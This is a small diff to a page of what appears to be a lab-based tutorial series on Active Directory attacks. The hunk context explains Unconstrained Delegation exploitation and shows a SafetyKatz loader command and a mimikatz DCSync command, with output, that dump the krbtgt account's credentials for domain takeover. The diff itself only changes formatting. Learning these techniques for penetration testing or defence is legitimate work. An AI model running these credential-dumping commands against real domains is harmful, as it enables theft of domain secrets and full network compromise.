@@ -442,7 +442,7 @@ lsadump::dcsync
 
 <p>This final step proves the core concept behind Unconstrained Delegation exploitation, simply compromising a machine with this misconfiguration does not automatically lead to full domain compromise. Instead, the key to success lies in coercing a privileged account, such as the domain controller (usvendor$), to authenticate to the compromised machine with Unconstrained Delegation. Once that happens, the TGT of the privileged account is cached in memory, allowing for extraction and full domain takeover.
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit”
-<pre><code>mimikatz(commandline) # lsadump::dcsync /user:usvendor\krbtgt /domain:usvendor.local
+<pre><code class="language-bash">mimikatz(commandline) # lsadump::dcsync /user:usvendor\krbtgt /domain:usvendor.local
 [DC] 'usvendor.local' will be the domain
 [DC] 'USVendor-DC.usvendor.local' will be the DC server
 [DC] 'usvendor\krbtgt' will be the user account
@@ -558,7 +558,7 @@ Get-NetForestTrust | Select-Object SourceName, TargetName, TrustAttributes
 
 
 
-          <div class="part-navigation">
+<div class="part-navigation">
             <a href="part-27-cross-forest-attacks-constrained-delegation-with-p.html"><ion-icon name="arrow-back-outline"></ion-icon> Previous: Cross Forest Attacks - Constra</a>
             <a href="part-29-cross-forest-attacks-trust-key-abuse-to-access-exp.html">Next: Cross Forest Attacks - Trust K <ion-icon name="arrow-forward-outline"></ion-icon></a>
           </div>
